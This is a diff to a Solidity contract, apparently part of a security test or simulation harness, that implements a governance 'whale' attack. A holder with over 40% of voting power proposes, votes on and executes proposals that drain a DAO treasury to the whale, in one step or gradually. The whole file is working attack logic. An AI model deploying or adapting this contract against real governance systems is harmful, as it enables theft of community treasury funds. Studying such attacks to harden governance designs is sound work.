@@ -1,8 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-
 /**
  * @title WhaleManipulation
  * @dev Simulates a whale holder accumulating >40-51% of voting power
@@ -117,11 +115,7 @@ contract WhaleManipulation {
     // Constructor
     // ─────────────────────────────────────────────────────────────────────────
 
-    constructor(
-        address _governanceToken,
-        address _governor,
-        address _targetTreasury
-    ) {
+    constructor(address _governanceToken, address _governor, address _targetTreasury) {
         require(_governanceToken != address(0), "Invalid token");
         require(_governor != address(0), "Invalid governor");
         require(_targetTreasury != address(0), "Invalid treasury");
@@ -142,10 +136,7 @@ contract WhaleManipulation {
      * @param whale The address of the whale holder
      * @param treasuryDrainAmount The amount to attempt stealing from treasury
      */
-    function executeWhaleAttack(
-        address whale,
-        uint256 treasuryDrainAmount
-    ) external returns (bool) {
+    function executeWhaleAttack(address whale, uint256 treasuryDrainAmount) external returns (bool) {
         require(whale != address(0), "Invalid whale address");
         require(treasuryDrainAmount > 0, "Invalid drain amount");
 
@@ -154,6 +145,7 @@ contract WhaleManipulation {
         // Get whale's voting power
         uint256 whaleVotes = IVotesToken(governanceToken).getVotes(whale);
         uint256 totalSupply = IVotesToken(governanceToken).totalSupply();
+        uint256 attackContractVotes = IVotesToken(governanceToken).getVotes(address(this));
 
         require(whaleVotes > 0, "Whale has no voting power");
 
@@ -170,6 +162,12 @@ contract WhaleManipulation {
             return false;
         }
 
+        // castVote() is executed by this contract, so voting power must be delegated here.
+        if (attackContractVotes < whaleVotes) {
+            emit AttackFailed("Delegate whale votes to attack contract before voting");
+            return false;
+        }
+
         try this._performWhaleAttack(whale, treasuryDrainAmount) returns (bool success) {
             return success;
         } catch Error(string memory reason) {
@@ -182,12 +180,99 @@ contract WhaleManipulation {
     }
 
     /**
+     * @notice Phase 1: create whale proposal only (whale must vote directly on governor).
+     * @dev This keeps vote attribution accurate because governor reads msg.sender.
+     */
+    function createWhaleProposal(address whale, uint256 treasuryDrainAmount) external returns (uint256 proposalId) {
+        require(whale != address(0), "Invalid whale address");
+        require(treasuryDrainAmount > 0, "Invalid drain amount");
+
+        whaleAttacker = whale;
+
+        uint256 whaleVotes = IVotesToken(governanceToken).getVotes(whale);
+        uint256 totalSupply = IVotesToken(governanceToken).totalSupply();
+        require(whaleVotes > 0, "Whale has no voting power");
+
+        whaleHoldingPercentage = (whaleVotes * 10000) / totalSupply;
+        emit WhaleIdentified(whale, whaleVotes, whaleHoldingPercentage);
+
+        if (whaleHoldingPercentage < 4000) {
+            emit AttackFailed("Whale voting power too low (requires >40%)");
+            return 0;
+        }
+
+        // Build proposal payload but do not vote from this contract.
+        address[] memory targets = new address[](1);
+        targets[0] = targetTreasury;
+
+        uint256[] memory values = new uint256[](1);
+        values[0] = 0;
+
+        bytes[] memory calldatas = new bytes[](1);
+        calldatas[0] = abi.encodeWithSignature(
+            "withdrawWithinLimit(address,uint256,address)", governanceToken, treasuryDrainAmount, whale
+        );
+
+        string memory description = "PROPOSAL: Whale Treasury Allocation - Emergency Deployment Funds";
+        proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
+        submittedProposals.push(proposalId);
+
+        proposalDetails[proposalId] = ProposalDetails({
+            createdAt: block.number,
+            votingPower: whaleVotes,
+            targetAmount: treasuryDrainAmount,
+            executed: false,
+            description: description
+        });
+
+        emit ProposalSubmitted(proposalId, description, treasuryDrainAmount);
+    }
+
+    /**
+     * @notice Phase 2: execute after whale externally casts vote on governor.
+     * @dev Expected external step: whale calls IGovernor(governor).castVote(proposalId, 1).
+     */
+    function executeAfterWhaleVote(uint256 proposalId) external returns (bool) {
+        ProposalDetails memory detail = proposalDetails[proposalId];
+        require(detail.createdAt != 0, "Unknown proposal");
+
+        // Only execute after governance outcome is finalized as succeeded.
+        if (IGovernor(governor).state(proposalId) != PROPOSAL_STATE_SUCCEEDED) {
+            emit AttackFailed("Proposal not succeeded yet");
+            return false;
+        }
+
+        address whale = whaleAttacker;
+
+        address[] memory targets = new address[](1);
+        targets[0] = targetTreasury;
+
+        uint256[] memory values = new uint256[](1);
+        values[0] = 0;
+
+        bytes[] memory calldatas = new bytes[](1);
+        calldatas[0] = abi.encodeWithSignature(
+            "withdrawWithinLimit(address,uint256,address)", governanceToken, detail.targetAmount, whale
+        );
+
+        bytes32 descriptionHash = _hashDescription(detail.description);
+
+        try IGovernor(governor).execute(targets, values, calldatas, descriptionHash) {
+            proposalDetails[proposalId].executed = true;
+            attackSucceeded = true;
+            amountStolenFromTreasury = detail.targetAmount;
+            emit TreasuryDrained(proposalId, detail.targetAmount);
+            return true;
+        } catch {
+            emit AttackFailed("Failed to execute whale proposal");
+            return false;
+        }
+    }
+
+    /**
      * @notice Internal function to perform the whale attack
      */
-    function _performWhaleAttack(
-        address whale,
-        uint256 treasuryDrainAmount
-    ) external returns (bool) {
+    function _performWhaleAttack(address whale, uint256 treasuryDrainAmount) external returns (bool) {
         require(msg.sender == address(this), "Only internal call allowed");
 
         // Create a proposal: Treasury transfer to whale
@@ -198,19 +283,21 @@ contract WhaleManipulation {
         values[0] = 0;
 
         bytes[] memory calldatas = new bytes[](1);
-        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", whale, treasuryDrainAmount);
+        calldatas[0] = abi.encodeWithSignature(
+            "withdrawWithinLimit(address,uint256,address)", governanceToken, treasuryDrainAmount, whale
+        );
 
         string memory description = "PROPOSAL: Whale Treasury Allocation - Emergency Deployment Funds";
-        bytes32 descriptionHash = keccak256(abi.encodePacked(description));
+        bytes32 descriptionHash = _hashDescription(description);
 
         // Create proposal
         uint256 proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
         submittedProposals.push(proposalId);
 
-        uint256 whaleVotes = IVotesToken(governanceToken).getVotes(whale);
+        uint256 attackContractVotes = IVotesToken(governanceToken).getVotes(address(this));
         proposalDetails[proposalId] = ProposalDetails({
             createdAt: block.number,
-            votingPower: whaleVotes,
+            votingPower: attackContractVotes,
             targetAmount: treasuryDrainAmount,
             executed: false,
             description: description
@@ -218,9 +305,9 @@ contract WhaleManipulation {
 
         emit ProposalSubmitted(proposalId, description, treasuryDrainAmount);
 
-        // Vote on the proposal with whale's voting power
+        // Vote on the proposal using this contract's delegated voting power.
         IGovernor(governor).castVote(proposalId, VOTE_FOR);
-        emit ProposalVoted(proposalId, whaleVotes);
+        emit ProposalVoted(proposalId, attackContractVotes);
 
         // Simulate waiting for voting to complete
         // In a real test, we'd need to fast-forward blocks
@@ -245,15 +332,23 @@ contract WhaleManipulation {
      * @param numberOfProposals How many proposals to create
      * @param amountPerProposal Amount to drain in each proposal
      */
-    function executeGradualDraining(
-        address whale,
-        uint256 numberOfProposals,
-        uint256 amountPerProposal
-    ) external returns (uint256 totalDrained) {
+    function executeGradualDraining(address whale, uint256 numberOfProposals, uint256 amountPerProposal)
+        external
+        returns (uint256 totalDrained)
+    {
         require(numberOfProposals > 0, "Must create at least 1 proposal");
         require(amountPerProposal > 0, "Amount per proposal must be > 0");
 
         whaleAttacker = whale;
+        uint256 whaleVotes = IVotesToken(governanceToken).getVotes(whale);
+        uint256 attackContractVotes = IVotesToken(governanceToken).getVotes(address(this));
+
+        // Proposals are voted by this contract, so delegated votes must exist here.
+        if (whaleVotes == 0 || attackContractVotes < whaleVotes) {
+            emit AttackFailed("Delegate whale votes to attack contract before voting");
+            return 0;
+        }
+
         uint256 successfulProposals = 0;
         totalDrained = 0;
 
@@ -268,20 +363,14 @@ contract WhaleManipulation {
 
             bytes[] memory calldatas = new bytes[](1);
             calldatas[0] = abi.encodeWithSignature(
-                "approve(address,uint256)",
-                whale,
-                amountPerProposal
+                "withdrawWithinLimit(address,uint256,address)", governanceToken, amountPerProposal, whale
             );
 
-            string memory description = string(
-                abi.encodePacked("PROPOSAL: Whale Allocation Round ", _uint2str(i + 1))
-            );
+            string memory description = string(abi.encodePacked("PROPOSAL: Whale Allocation Round ", _uint2str(i + 1)));
 
-            bytes32 descriptionHash = keccak256(abi.encodePacked(description));
+            bytes32 descriptionHash = _hashDescription(description);
 
-            try IGovernor(governor).propose(targets, values, calldatas, description) returns (
-                uint256 proposalId
-            ) {
+            try IGovernor(governor).propose(targets, values, calldatas, description) returns (uint256 proposalId) {
                 // Vote for the proposal
                 try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
                     // Try to execute
@@ -362,14 +451,19 @@ contract WhaleManipulation {
             j /= 10;
         }
         bytes memory bstr = new bytes(len);
+        bytes memory digits = "0123456789";
         uint256 k = len;
         while (_i != 0) {
-            k = k - 1;
-            uint8 temp = (48 + uint8(_i - (_i / 10) * 10));
-            bytes1 b1 = bytes1(temp);
-            bstr[k] = b1;
+            k--;
+            bstr[k] = digits[_i % 10];
             _i /= 10;
         }
         return string(bstr);
+    }
+
+    function _hashDescription(string memory description) internal pure returns (bytes32 hash) {
+        assembly {
+            hash := keccak256(add(description, 32), mload(description))
+        }
     }
 }
